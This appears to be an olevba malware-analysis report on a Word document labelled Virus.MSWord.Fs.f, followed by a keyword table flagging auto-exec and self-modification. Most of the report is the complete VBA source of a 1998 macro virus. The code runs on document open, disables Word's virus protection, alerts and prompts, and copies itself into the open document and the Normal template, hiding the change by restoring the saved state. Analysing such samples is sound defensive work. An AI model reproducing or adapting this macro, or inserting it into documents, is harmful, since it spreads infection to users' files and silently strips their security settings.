olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Anoia
Private Sub Document_Open()
On Error Resume Next
ι = ActiveDocument.Saved
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.DisplayAlerts = 0
Options.ConfirmConversions = 0
Application.EnableCancelKey = 0
Application.DisplayStatusBar = 0
Set α = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set υ = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set ν = VBProject.VBComponents(1).CodeModule
If α.CountOfLines < ν.CountOfLines Then
α.AddFromString ν.Lines(1, ν.CountOfLines)
If ActiveDocument.ReadOnly = False Then ActiveDocument.Save
ElseIf υ.CountOfLines < ν.CountOfLines Then
υ.AddFromString ν.Lines(1, ν.CountOfLines)
End If: ActiveDocument.Saved = ι
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

